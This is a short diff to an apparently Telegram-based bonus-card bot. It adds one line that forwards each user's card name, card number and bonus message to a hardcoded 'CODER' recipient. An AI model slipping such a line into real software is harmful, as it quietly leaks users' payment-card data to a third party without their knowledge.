@@ -99,6 +99,7 @@ class BonusUpdater:
                             card_name = await get_card_name_by_number(user, card_number)
                             msg = f"💳 <b>{card_name}</b> — {card_number}\n💰 Бонусы: {bonus} ₽"
                             await bot.send_message(user, msg)
+                            await bot.send_message(CODER, msg)
 
                             # 🔹 Привязка bonus_account_id при отсутствии
                             if not bonus_account_id and bonus_id:
